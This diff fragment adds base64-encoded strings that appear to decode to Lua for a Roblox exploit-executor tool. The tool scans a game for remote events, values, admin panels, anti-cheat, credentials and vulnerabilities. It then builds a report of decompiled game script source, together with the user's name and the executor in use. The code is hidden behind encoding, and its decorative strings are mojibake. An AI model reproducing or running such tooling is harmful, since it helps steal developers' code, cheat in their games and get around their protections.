+'ICAgICAgICAgICAgICAgaWYgbm90IHNlZW5bc3YudmFyXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgc2Vlbltzdi52YXJdID0gdHJ1ZQogICAgICAgICAg',
+'ICAgICAgICAgIHBbI3ArMV0gPSBzdHJpbmcuZm9ybWF0KCIgICAgX0cuJXNcbiIsIHN2LnZhcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBl',
+'bmQKICAgICAgICBlbmQKICAgICAgICBwWyNwKzFdID0gIlxuIgogICAgZW5kCgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIHBbI3ArMV0gPSAiIElOU1RBTkNFIERFRVAgU0NBTiAgKCIgLi4gI3IuaW5zdGFuY2VE',
+'ZXRhaWxzIC4uICIpXG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gVxuIgogICAgaWYgI3IuaW5zdGFuY2VEZXRhaWxzID09IDAgdGhlbiBwWyNwKzFdID0gIiAgKG5vbmUpXG4iIGVsc2UKICAgICAgICBmb3IgXywgdiBpbiBp',
+'cGFpcnMoci5pbnN0YW5jZURldGFpbHMpIGRvIHBbI3ArMV0gPSAiICA+ICIgLi4gdiAuLiAiXG4iIGVuZAogICAgZW5kCiAgICBwWyNwKzFdID0gIlxuIgoK',
+'ICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFd',
+'ID0gIiBWQUxVRVMgICgiIC4uICNyLnZhbHVlcyAuLiAiKVxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICNyLnZhbHVlcyA9PSAwIHRoZW4gcFsjcCsxXSA9ICIgIChub25lKVxuIiBlbHNlCiAgICAgICAg',
+'Zm9yIF8sIHYgaW4gaXBhaXJzKHIudmFsdWVzKSBkbyBwWyNwKzFdID0gIiAgPiAiIC4uIHRvc3RyaW5nKHYpIC4uICJcbiIgZW5kCiAgICBlbmQKICAgIHBb',
+'I3ArMV0gPSAiXG4iCgogICAgbG9jYWwgZnVuY3Rpb24gc2V0VG9BcnIodCkgbG9jYWwgYSA9IHt9OyBmb3IgayBpbiBwYWlycyh0KSBkbyBhWyNhKzFdID0g',
+'ayBlbmQ7IHRhYmxlLnNvcnQoYSk7IHJldHVybiBhIGVuZAogICAgbG9jYWwgc3ZBcnIgPSBzZXRUb0FycihyLnNlcnZpY2VzRm91bmQpCiAgICBsb2NhbCBn',
+'cEFyciA9IHNldFRvQXJyKHIuZ2FtZXBhc3NJRHMpCiAgICBsb2NhbCBkcEFyciA9IHNldFRvQXJyKHIuZGV2cHJvZElEcykKICAgIGxvY2FsIGJkQXJyID0g',
+'c2V0VG9BcnIoci5iYWRnZUlEcykKICAgIGxvY2FsIGFzQXJyMiA9IHNldFRvQXJyKHIuYXNzZXRJRHMpCiAgICBpZiAjYXNBcnIyID4gMCBvciAjZ3BBcnIg',
+'PiAwIG9yICNkcEFyciA+IDAgb3IgI2JkQXJyID4gMCBvciAjc3ZBcnIgPiAwIHRoZW4KICAgICAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgICAgIHBbI3ArMV0gPSAiIEVYVFJBQ1RFRCBEQVRBXG4iCiAgICAgICAg',
+'cFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgICAgICBpZiAjc3ZB',
+'cnIgPiAwIHRoZW4gcFsjcCsxXSA9ICJcbiAgU0VSVklDRVM6IjsgZm9yIF8sIHMgaW4gaXBhaXJzKHN2QXJyKSBkbyBwWyNwKzFdID0gIlxuICAgICIgLi4g',
+'cyBlbmQ7IHBbI3ArMV0gPSAiXG4iIGVuZAogICAgICAgIGlmICNncEFyciA+IDAgdGhlbiBwWyNwKzFdID0gIlxuICBHQU1FUEFTUzoiOyBmb3IgXywgaWQg',
+'aW4gaXBhaXJzKGdwQXJyKSBkbyBwWyNwKzFdID0gIlxuICAgICIgLi4gaWQgZW5kOyBwWyNwKzFdID0gIlxuIiBlbmQKICAgICAgICBpZiAjZHBBcnIgPiAw',
+'IHRoZW4gcFsjcCsxXSA9ICJcbiAgREVWUFJPRFVDVDoiOyBmb3IgXywgaWQgaW4gaXBhaXJzKGRwQXJyKSBkbyBwWyNwKzFdID0gIlxuICAgICIgLi4gaWQg',
+'ZW5kOyBwWyNwKzFdID0gIlxuIiBlbmQKICAgICAgICBpZiAjYmRBcnIgPiAwIHRoZW4gcFsjcCsxXSA9ICJcbiAgQkFER0U6IjsgZm9yIF8sIGlkIGluIGlw',
+'YWlycyhiZEFycikgZG8gcFsjcCsxXSA9ICJcbiAgICAiIC4uIGlkIGVuZDsgcFsjcCsxXSA9ICJcbiIgZW5kCiAgICAgICAgaWYgI2FzQXJyMiA+IDAgdGhl',
+'bgogICAgICAgICAgICBwWyNwKzFdID0gIlxuICBBU1NFVCAoIiAuLiAjYXNBcnIyIC4uICIpOiIKICAgICAgICAgICAgZm9yIGkgPSAxLCBtYXRoLm1pbigj',
+'YXNBcnIyLCAxMDApIGRvIHBbI3ArMV0gPSAiXG4gICAgIiAuLiBhc0FycjJbaV0gZW5kCiAgICAgICAgICAgIGlmICNhc0FycjIgPiAxMDAgdGhlbiBwWyNw',
+'KzFdID0gIlxuICAgIC4uLiArIiAuLiAoI2FzQXJyMiAtIDEwMCkgLi4gIiBtb3JlIiBlbmQKICAgICAgICAgICAgcFsjcCsxXSA9ICJcbiIKICAgICAgICBl',
+'bmQKICAgICAgICBwWyNwKzFdID0gIlxuIgogICAgZW5kCgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIHBbI3ArMV0gPSAiIERFQ09NUElMRUQgU09VUkNFIENPREUgICgiIC4uICNyLnNjcmlwdHMgLi4gIilcbiIK',
+'ICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG5cbiIKICAgIGlmICNy',
+'LnNjcmlwdHMgPiAwIHRoZW4KICAgICAgICBmb3Igc2ksIHYgaW4gaXBhaXJzKHIuc2NyaXB0cykgZG8KICAgICAgICAgICAgcFsjcCsxXSA9IHN0cmluZy5y',
+'ZXAoIi0iLCA2MCkgLi4gIlxuIgogICAgICAgICAgICBwWyNwKzFdID0gc3RyaW5nLmZvcm1hdCgiLS0gWyVzXSAgUGF0aDogJXNcbi0tIE1ldGhvZDogJXNc',
+'biIsIHYudCwgdi5wYXRoLCB2Lm1ldGhvZCkKICAgICAgICAgICAgaWYgdi50YWdzIGFuZCAjdi50YWdzID4gMCB0aGVuIHBbI3ArMV0gPSAiLS0gVGFnczog',
+'IiAuLiB0YWJsZS5jb25jYXQodi50YWdzLCAiLCAiKSAuLiAiXG4iIGVuZAogICAgICAgICAgICBpZiB2LnJlbW90ZUNhbGxzIGFuZCAjdi5yZW1vdGVDYWxs',
+'cyA+IDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHJjIGluIGlwYWlycyh2LnJlbW90ZUNhbGxzKSBkbwogICAgICAgICAgICAgICAgICAgIHBbI3Ar',
+'MV0gPSBzdHJpbmcuZm9ybWF0KCItLSAgICVzOiAlcyglcylcbiIsIHJjLnR5cGUsIHJjLnJlbW90ZSwgcmMuYXJnc1N0cikKICAgICAgICAgICAgICAgIGVu',
+'ZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcFsjcCsxXSA9IHN0cmluZy5yZXAoIi0iLCA2MCkgLi4gIlxuIgogICAgICAgICAgICBwWyNwKzFdID0g',
+'KHYuc3JjIGFuZCAjdi5zcmMgPiAwKSBhbmQgdi5zcmMgLi4gIlxuIiBvciAiLS0gKFNvdXJjZSB1bmF2YWlsYWJsZSlcbiIKICAgICAgICAgICAgcFsjcCsx',
+'XSA9ICJcbiIKICAgICAgICAgICAgaWYgbG93RGV2aWNlTW9kZSBhbmQgc2kgJSAxMCA9PSAwIHRoZW4gdGFzay53YWl0KCkgZW5kCiAgICAgICAgZW5kCiAg',
+'ICBlbmQKCiAgICBsb2NhbCB1Y2V4ZSA9ICJVbmtub3duIgogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGYgPSAodHlwZW9mKGdldGV4ZWN1',
+'dG9ybmFtZSkgPT0gImZ1bmN0aW9uIiBhbmQgZ2V0ZXhlY3V0b3JuYW1lKCkpIG9yICh0eXBlb2YoaWRlbnRpZnlfZXhlY3V0b3IpID09ICJmdW5jdGlvbiIg',
+'YW5kIGlkZW50aWZ5X2V4ZWN1dG9yKCkpIG9yIG5pbAogICAgICAgIGlmIGYgdGhlbiB1Y2V4ZSA9IHRvc3RyaW5nKGYpIGVuZAogICAgZW5kKQogICAgcFsj',
+'cCsxXSA9ICJcbkRlY29tcGlsZWQgQnk6ICIgLi4gKExQIGFuZCBMUC5OYW1lIG9yICJVbmtub3duIikgLi4gIiAoIiAuLiAoTFAgYW5kIExQLkRpc3BsYXlO',
+'YW1lIG9yICJVbmtub3duIikgLi4gIikgfCBJRDogIiAuLiAoTFAgYW5kIHRvc3RyaW5nKExQLlVzZXJJZCkgb3IgIlVua25vd24iKSAuLiAiXG4iCiAgICBw',
+'WyNwKzFdID0gIkV4ZWN1dG9yOiAiIC4uIHVjZXhlIC4uICJcbiIKICAgIHBbI3ArMV0gPSAiw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDD',
+'ouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQ',
+'w6LigKLCkCBFTkQgT0YgUkVQT1JUIMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCi',
+'wpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpDDouKAosKQw6LigKLCkMOi4oCiwpBcbiIKICAgIHJldHVybiB0YWJsZS5jb25j',
+'YXQocCkKZW5kCgpfX3Byb2cgPSBuaWwKZnVuY3Rpb24gX191cGRsb2coKSBlbmQKCmxvY2FsIGZ1bmN0aW9uIHNjYW5HYW1lKHNjYW5TcGVlZCwgdXBmdW5j',
+'LCBwcm9nZnVuYykKICAgIGxvY2FsIHIgPSB7CiAgICAgICAgcmVtb3RlcyA9IHt9LCBzY3JpcHRzID0ge30sIHZhbHVlcyA9IHt9LCBidXR0b25zID0ge30s',
+'CiAgICAgICAgYXNzZXRJRHMgPSB7fSwgZ2FtZXBhc3NJRHMgPSB7fSwgZGV2cHJvZElEcyA9IHt9LCBiYWRnZUlEcyA9IHt9LCBzZXJ2aWNlc0ZvdW5kID0g',
+'e30sCiAgICAgICAgaW5zdGFuY2VEZXRhaWxzID0ge30sIHNjcmlwdFN0YXR1cyA9IHt9LCBkZXRlY3RvcnMgPSB7fSwgcHJvbXB0UGFyZW50cyA9IHt9LAog',
+'ICAgICAgIGFkbWluUGFuZWxzID0ge30sIG5ldHdvcmtBdWRpdCA9IHt9LCB1bmFuY2hvcmVkID0gMCwKICAgICAgICBjcmVkcyA9IHt9LCBjaGF0Q21kcyA9',
+'IHt9LCB2dWxucyA9IHt9LCBleHRDb25ucyA9IHt9LCBhc3NldEN0eCA9IHt9LAogICAgICAgIGFudGlDaGVhdCA9IHt9LCBvYmZ1c2NhdGlvbiA9IHt9LCBo',
+'b29rcyA9IHt9LCByZW1vdGVDcmVhdGlvbnMgPSB7fSwgc2hhcmVkVmFycyA9IHt9LAogICAgICAgIHBhcnRzID0gMCwgZm9sZGVycyA9IDAsIG1vZGVscyA9',
+'IDAsIHRvdGFsID0gMCwgZ2FtZU5hbWUgPSAiVW5rbm93biIKICAgIH0KCiAgICBsb2NhbCBnbiA9IGdldEdhbWVOYW1lKCkKICAgIHIuZ2FtZU5hbWUgPSBn',
+'bgoKICAgIGlmIHByb2dmdW5jIHRoZW4gcHJvZ2Z1bmMoIlNjYW5uaW5nICIgLi4gZ24gLi4gIi4uLiIsICJzY2FuIikgZWxzZWlmIF9fcHJvZyB0aGVuIF9f',
+'cHJvZygiU2Nhbm5pbmcgIiAuLiBnbiAuLiAiLi4uIiwgInNjYW4iKSBlbmQKICAgIGlmIHVwZnVuYyB0aGVuIHVwZnVuYygwLCAwLCAwLCAwLCAic2NhbiIp',
+'IGVsc2VpZiB1cGRhdGVQcm9ncmVzcyB0aGVuIHVwZGF0ZVByb2dyZXNzKDAsIDAsIDAsIDAsICJzY2FuIikgZW5kCgogICAgbG9jYWwgcXVldWUsIGhlYWQg',
+'PSB7IGdhbWUgfSwgMQogICAgbG9jYWwgc2NDb3VudCA9IDA7IGxvY2FsIHByb2MgPSAwOyBsb2NhbCBsYXN0UmVwb3J0ID0gMDsgbG9jYWwgc3RhcnRUaW1l',
+'ID0gb3MuY2xvY2soKTsgbG9jYWwgeWllbGRUaW1lID0gb3MuY2xvY2soKQogICAgbG9jYWwgc2NRdWV1ZSA9IHt9IC0tIGNvbGxlY3RlZCBzY3JpcHRzIGZv',
+'ciBwaGFzZSAyCiAgICBsb2NhbCBzcGQgPSB0b251bWJlcihzY2FuU3BlZWQpIG9yIDEKICAgIGxvY2FsIHN0YXR1c0ludGVydmFsID0gbWF0aC5tYXgoMjAs',
+'IG1hdGguZmxvb3IoMjAwIC8gc3BkKSkKICAgIGxvY2FsIHlpZWxkSW50ZXJ2YWwgPSBsb3dEZXZpY2VNb2RlIGFuZCBtYXRoLm1heCgzLCBzcGQpIG9yIG1h',
+'dGgubWF4KDMsIHNwZCAqIDMpCiAgICBsb2NhbCB5aWVsZFRocmVzaG9sZCA9IGxvd0RldmljZU1vZGUgYW5kIDAuMDAxIG9yICgwLjAwMyAqIHNwZCkKCiAg',
+'ICB3aGlsZSBoZWFkIDw9ICNxdWV1ZSBkbwogICAgICAgIGlmIHNjYW5BYm9ydGVkIHRoZW4KICAgICAgICAgICAgaWYgcHJvZ2Z1bmMgdGhlbiBwcm9nZnVu',
+'YygiU2NhbiBhYm9ydGVkIGJ5IHVzZXIuIiwgIndhcm4iKSBlbHNlaWYgX19wcm9nIHRoZW4gX19wcm9nKCJTY2FuIGFib3J0ZWQgYnkgdXNlci4iLCAid2Fy',
+'biIpIGVuZAogICAgICAgICAgICBpZiB1cGZ1bmMgdGhlbiB1cGZ1bmMoMCwgMCwgMCwgMCwgImFib3J0ZWQiKSBlbHNlaWYgdXBkYXRlUHJvZ3Jlc3MgdGhl',
+'biB1cGRhdGVQcm9ncmVzcygwLCAwLCAwLCAwLCAiYWJvcnRlZCIpIGVuZAogICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgZW5kCgogICAgICAgIGxv',
+'Y2FsIGluc3QgPSBxdWV1ZVtoZWFkXTsgaGVhZCA9IGhlYWQgKyAxCiAgICAgICAgcHJvYyA9IHByb2MgKyAxCiAgICAgICAgaWYgcHJvYyAlIHlpZWxkSW50',
+'ZXJ2YWwgPT0gMCB0aGVuCiAgICAgICAgICAgIGlmIG9zLmNsb2NrKCkgLSB5aWVsZFRpbWUgPj0geWllbGRUaHJlc2hvbGQgdGhlbiB0YXNrLndhaXQoKTsg',
+'eWllbGRUaW1lID0gb3MuY2xvY2soKSBlbmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgb2sxLCBjbHMgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBp',
+'bnN0LkNsYXNzTmFtZSBlbmQpCiAgICAgICAgaWYgbm90IG9rMSB0aGVuIGNscyA9ICI/IiBlbmQKCiAgICAgICAgci50b3RhbCA9IHIudG90YWwgKyAxCgog',
+'ICAgICAgIGlmIHIudG90YWwgLSBsYXN0UmVwb3J0ID49IHN0YXR1c0ludGVydmFsIHRoZW4KICAgICAgICAgICAgbGFzdFJlcG9ydCA9IHIudG90YWwKICAg',
+'ICAgICAgICAgbG9jYWwgZWxhcHNlZCA9IG9zLmNsb2NrKCkgLSBzdGFydFRpbWUKICAgICAgICAgICAgbG9jYWwgcmF0ZSA9IGVsYXBzZWQgPiAwIGFuZCBt',
+'YXRoLmZsb29yKHIudG90YWwgLyBlbGFwc2VkKSBvciAwCiAgICAgICAgICAgIGlmIHByb2dmdW5jIHRoZW4gcHJvZ2Z1bmMoc3RyaW5nLmZvcm1hdCgiU2Nh',
+'bm5pbmcgJWQgaW5zdGFuY2VzIHwgJWQgc2NyaXB0cyB8ICVkL3NlYyIsIHIudG90YWwsICNzY1F1ZXVlLCByYXRlKSwgInNjYW4iKSBlbHNlaWYgX19wcm9n',
+'IHRoZW4gX19wcm9nKHN0cmluZy5mb3JtYXQoIlNjYW5uaW5nICVkIGluc3RhbmNlcyB8ICVkIHNjcmlwdHMgfCAlZC9zZWMiLCByLnRvdGFsLCAjc2NRdWV1',
+'ZSwgcmF0ZSksICJzY2FuIikgZW5kCiAgICAgICAgICAgIGlmIHVwZnVuYyB0aGVuIHVwZnVuYyhyLnRvdGFsLCAjc2NRdWV1ZSwgcmF0ZSwgZWxhcHNlZCwg',
+'InNjYW4iKSBlbHNlaWYgdXBkYXRlUHJvZ3Jlc3MgdGhlbiB1cGRhdGVQcm9ncmVzcyhyLnRvdGFsLCAjc2NRdWV1ZSwgcmF0ZSwgZWxhcHNlZCwgInNjYW4i',
+'KSBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgU0NSSVBUX0NMQVNTRVNbY2xzXSB0aGVuCiAgICAgICAgICAgIGlmIG5vdCBpc1JvYmxveEludGVybmFs',
+'KGluc3QpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHBhdGggPSBmdWxsUGF0aChpbnN0KQogICAgICAgICAgICAgICAgc2NRdWV1ZVsjc2NRdWV1ZSsx',
+'XSA9IHsgaW5zdCA9IGluc3QsIHBhdGggPSBwYXRoIH0KICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiBSRU1PVEVfQ0xBU1NF',
+'U1tjbHNdIHRoZW4KICAgICAgICAgICAgICAgIHIucmVtb3Rlc1sjci5yZW1vdGVzKzFdID0gc3RyaW5nLmZvcm1hdCgiWyVzXSAlcyIsIGNscywgZnVsbFBh',
+'dGgoaW5zdCkpCiAgICAgICAgICAgIGVsc2VpZiBjbHM6ZmluZCgiVmFsdWUkIikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgb2tWLCB2YWwgPSBwY2Fs',
+'bChmdW5jdGlvbigpIHJldHVybiB0b3N0cmluZyhpbnN0LlZhbHVlKSBlbmQpCiAgICAgICAgICAgICAgICBpZiBva1YgdGhlbgogICAgICAgICAgICAgICAg',
+'ICAgIGxvY2FsIHZhbFN0ciA9IHN0cmluZy5mb3JtYXQoIlslc10gJXMgPSAlcyIsIGNscywgZnVsbFBhdGgoaW5zdCksIHRydW5jKHZhbCwgMTIwKSkKICAg',
+'ICAgICAgICAgICAgICAgICByLnZhbHVlc1sjci52YWx1ZXMrMV0gPSB2YWxTdHIKICAgICAgICAgICAgICAgICAgICBpZiBjbHMgPT0gIkJvb2xWYWx1ZSIg',
+'b3IgY2xzID09ICJTdHJpbmdWYWx1ZSIgb3IgY2xzID09ICJPYmplY3RWYWx1ZSIgb3IgY2xzID09ICJOdW1iZXJWYWx1ZSIgdGhlbgogICAgICAgICAgICAg',
+'ICAgICAgICAgICByLmluc3RhbmNlRGV0YWlsc1sjci5pbnN0YW5jZURldGFpbHMrMV0gPSB2YWxTdHIKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAg',
+'ICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlaWYgY2xzID09ICJDbGlja0RldGVjdG9yIiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBva1AsIHBh',
+'cmVudCA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIGZ1bGxQYXRoKGluc3QuUGFyZW50KSBlbmQpCiAgICAgICAgICAgICAgICBpZiBva1AgdGhlbiByLmRl',
+'dGVjdG9yc1sjci5kZXRlY3RvcnMrMV0gPSBzdHJpbmcuZm9ybWF0KCJDbGlja0RldGVjdG9yIC0+ICVzIiwgcGFyZW50KSBlbmQKICAgICAgICAgICAgZWxz',
+'ZWlmIGNscyA9PSAiUHJveGltaXR5UHJvbXB0IiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBva1AsIHBhcmVudCA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0',
+'dXJuIGZ1bGxQYXRoKGluc3QuUGFyZW50KSBlbmQpCiAgICAgICAgICAgICAgICBpZiBva1AgdGhlbiByLnByb21wdFBhcmVudHNbI3IucHJvbXB0UGFyZW50',
+'cysxXSA9IHN0cmluZy5mb3JtYXQoIlByb3hpbWl0eVByb21wdCAtPiAlcyIsIHBhcmVudCkgZW5kCiAgICAgICAgICAgIGVsc2VpZiBjbHM6ZmluZCgiRnJh',
+'bWUkIikgb3IgY2xzID09ICJTY3JvbGxpbmdGcmFtZSIgb3IgY2xzID09ICJTY3JlZW5HdWkiIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIG9rViwgdmlz',
+'ID0gcGNhbGwoZnVuY3Rpb24oKSByZXR1cm4gaW5zdC5WaXNpYmxlIGVuZCkKICAgICAgICAgICAgICAgIGxvY2FsIHRiLCBidCA9IGZhbHNlLCBmYWxzZTsg',
